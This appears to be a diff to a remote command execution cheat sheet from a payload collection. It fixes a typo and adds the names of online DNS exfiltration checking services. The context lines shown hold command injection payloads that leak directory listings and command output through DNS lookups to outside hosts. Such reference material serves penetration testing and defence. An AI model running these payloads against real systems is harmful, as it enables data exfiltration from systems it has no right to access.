@@ -1,6 +1,6 @@
 # Remote Commands Execution
 
-Remote Commands execution is a security vulnerability that allows an attacker to execute Commandss from a remote server.
+Remote Commands execution is a security vulnerability that allows an attacker to execute commands from a remote server.
 NOTE: Reverse Shell Command are relocated to a [single file](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 ## Exploits
@@ -155,6 +155,11 @@ for i in $(ls /) ; do host "http://$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 ```powershell
 $(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
 ```
+
+Online tools to check for DNS based data exfiltration:
+
+- dnsbin.zhack.ca
+- pingb.in
 
 ## References
 
